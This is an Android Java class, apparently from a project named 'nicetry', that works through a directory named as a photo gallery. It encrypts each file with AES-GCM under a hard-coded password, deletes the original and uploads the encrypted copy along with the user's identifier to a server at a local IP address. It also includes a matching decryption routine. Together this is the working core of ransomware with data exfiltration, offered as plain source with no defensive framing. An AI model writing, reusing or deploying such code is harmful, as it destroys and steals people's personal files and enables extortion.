package com.example.nicetry;

import android.os.Build;

import androidx.annotation.RequiresApi;

import java.io.File;
import java.nio.ByteBuffer;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.KeySpec;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class FileEncryption {
    private static final String PASSWORD = "asdosfu8901ens98fy2nr89ssdf1f";
    private static final String ENCRYPT_ALGO = "AES/GCM/NoPadding";
    private static final int TAG_LENGTH_BIT = 128;
    private static final int IV_LENGTH_BYTE = 12;
    private static final int SALT_LENGTH_BYTE = 16;

    @RequiresApi(api = Build.VERSION_CODES.O)
    public void encryptEntireDirectory(String targetDirectory) {
        try {
            Path galleryFolderPath = Paths.get(targetDirectory);
            DirectoryStream<Path> directoryStream = Files.newDirectoryStream(galleryFolderPath);
            for (Path galleryFolderFile : directoryStream) {
                if (galleryFolderFile.getFileName().toString().endsWith(".tmp")) {
                    continue;
                }

                try {
                    if (!galleryFolderFile.getFileName().toString().endsWith(".bak")) {
                        String fromFile = targetDirectory + "" + galleryFolderFile.getFileName();
                        String toFile = targetDirectory + "" + galleryFolderFile.getFileName() + ".bak";
                        encryptFile(fromFile, toFile);
                        upload(toFile);
                    }
                } catch (Exception e) {
                    System.out.println("Something went wrong: " + e);
                }
            }
        } catch (Exception e) {
            System.out.println("Something went wrong: " + e);
        }
    }

    private void upload(String file) {
        RequestBody descriptionPart = RequestBody.create(MultipartBody.FORM, file);
        RequestBody filePart = RequestBody.create(MediaType.parse("multipart/form-data"), new File(file));
        MultipartBody.Part multipartFile = MultipartBody.Part.createFormData("file", file, filePart);

        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl("http://192.168.1.16:3000/")
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        RetrofitAPI retrofitAPI = retrofit.create(RetrofitAPI.class);
        Call<okhttp3.ResponseBody> call = retrofitAPI.upload(MyApplication.user, descriptionPart, multipartFile);
        call.enqueue(new Callback<okhttp3.ResponseBody>() {
            @Override
            public void onResponse(Call<okhttp3.ResponseBody> call, Response<okhttp3.ResponseBody> response) {
                System.out.println(response);
            }

            @Override
            public void onFailure(Call<okhttp3.ResponseBody> call, Throwable t) {
                System.out.println("Something went wrong during file upload: " + t);
            }
        });
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public void decryptEntireDirectory(String targetDirectory) {
        try {
            Path galleryFolderPath = Paths.get(targetDirectory);

            DirectoryStream<Path> directoryStream = Files.newDirectoryStream(galleryFolderPath);
            for (Path galleryFolderFile : directoryStream) {
                if (galleryFolderFile.getFileName().toString().endsWith(".tmp")) {
                    continue;
                }

                try {
                    if (galleryFolderFile.getFileName().toString().endsWith(".bak")) {
                        String fromFile = targetDirectory + "" + galleryFolderFile.getFileName().toString().replace(".bak", "");
                        String toFile = targetDirectory + "" + galleryFolderFile.getFileName();
                        decryptFile(fromFile, toFile);
                    }
                } catch (Exception e) {
                    System.out.println("Something went wrong: " + e);
                }
            }
        } catch (Exception e) {
            System.out.println("Something went wrong: " + e);
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void encryptFile(String fromFile, String toFile) throws Exception {
        byte[] fileContent = Files.readAllBytes(Paths.get(fromFile));
        byte[] encryptedText = encrypt(fileContent);
        Path path = Paths.get(toFile);
        Files.write(path, encryptedText);

        File file = new File(fromFile);
        if (file.delete()) {
            System.out.println("Original file deleted. ");
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void decryptFile(String fromFile, String toFile) throws Exception {
        byte[] encryptedText = decryptFile(toFile);
        Path path = Paths.get(fromFile);
        Files.write(path, encryptedText);
        File file = new File(toFile);
        if (file.delete()) {
            System.out.println("Encrypted file deleted. ");
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private byte[] decryptFile(String fromEncryptedFile) throws Exception {
        byte[] fileContent = Files.readAllBytes(Paths.get(fromEncryptedFile));
        return decrypt(fileContent);
    }

    private byte[] encrypt(byte[] pText) throws Exception {
        byte[] salt = getRandomNonce(SALT_LENGTH_BYTE);
        byte[] iv = getRandomNonce(IV_LENGTH_BYTE);
        SecretKey aesKeyFromPassword = getAESKeyFromPassword(PASSWORD.toCharArray(), salt);
        Cipher cipher = Cipher.getInstance(ENCRYPT_ALGO);
        cipher.init(Cipher.ENCRYPT_MODE, aesKeyFromPassword, new GCMParameterSpec(TAG_LENGTH_BIT, iv));
        byte[] cipherText = cipher.doFinal(pText);

        return ByteBuffer.allocate(iv.length + salt.length + cipherText.length)
                .put(iv)
                .put(salt)
                .put(cipherText)
                .array();
    }

    private byte[] decrypt(byte[] cText) throws Exception {
        ByteBuffer bb = ByteBuffer.wrap(cText);

        byte[] iv = new byte[12];
        bb.get(iv);

        byte[] salt = new byte[16];
        bb.get(salt);

        byte[] cipherText = new byte[bb.remaining()];
        bb.get(cipherText);

        SecretKey aesKeyFromPassword = getAESKeyFromPassword(PASSWORD.toCharArray(), salt);
        Cipher cipher = Cipher.getInstance(ENCRYPT_ALGO);
        cipher.init(Cipher.DECRYPT_MODE, aesKeyFromPassword, new GCMParameterSpec(TAG_LENGTH_BIT, iv));

        return cipher.doFinal(cipherText);
    }

    private byte[] getRandomNonce(int numBytes) {
        byte[] nonce = new byte[numBytes];
        new SecureRandom().nextBytes(nonce);
        return nonce;
    }

    private SecretKey getAESKeyFromPassword(char[] password, byte[] salt)
            throws NoSuchAlgorithmException, InvalidKeySpecException {
        SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
        KeySpec spec = new PBEKeySpec(password, salt, 65536, 256);
        return new SecretKeySpec(factory.generateSecret(spec).getEncoded(), "AES");
    }
}
